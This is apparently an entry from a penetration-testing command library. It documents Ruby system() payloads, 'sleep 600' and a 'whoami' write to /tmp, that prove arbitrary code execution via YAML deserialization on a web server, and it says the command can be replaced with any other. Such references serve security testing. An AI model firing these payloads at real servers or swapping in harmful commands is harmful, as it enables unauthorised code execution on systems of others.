---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: system('sleep 600')
tags:
  - rce
  - demonstration
type: command
output: 'Process pauses for 600 seconds, demonstrating code execution.'
executor: ruby
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:56.594Z'
verified: false
validated: true
submitted: true
---
---

# system-sleep-600

## Command

```ruby
system('sleep 600')
```

## Description

This Ruby system call executes the shell command 'sleep 600' to pause for 10 minutes, used here to demonstrate arbitrary code execution via deserialization without causing permanent damage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'sleep 600'` | The shell command to execute; replace with any system command for different effects | Yes |

## Examples

### Basic Usage

```ruby
system('sleep 600')
```

### Advanced Usage

```ruby
system('whoami > /tmp/proof.txt')
```

## Expected Output

The Ruby process (and thus the web request) hangs for 600 seconds, after which it may timeout or error (e.g., 500 Internal Server Error), confirming command execution on the server.

## Related

- [[Related Procedure|procedures/Trigger-YAML-Deserialization-for-Code-Execution]]

---
